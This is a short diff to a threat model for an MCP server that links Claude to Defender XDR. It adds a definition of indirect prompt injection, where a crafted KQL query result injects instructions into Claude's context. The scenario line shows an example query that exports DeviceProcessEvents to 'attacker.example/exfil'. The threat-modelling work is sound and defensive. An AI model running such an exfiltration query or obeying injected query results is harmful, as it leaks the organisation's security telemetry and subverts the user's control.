@@ -46,7 +46,13 @@ Defender XDR. Generic OWASP advice is omitted in favor of specifics.
 
 ---
 
-## T1 — Prompt injection via KQL query input *(A1)*
+## T1 — Indirect Prompt Injection (KQL Query Input) *(A1)*
+
+> **Definition.** An attacker crafts a KQL query that, when executed by
+> the MCP server and returned to Claude, attempts to inject instructions
+> into the conversation context.
+>
+> *Related: OWASP Top 10 for LLM Applications — LLM01 (Prompt Injection).*
 
 **Scenario.** Claude passes a crafted `query` argument such as
 `.ingest into external_table('https://attacker.example/exfil') <- DeviceProcessEvents`,
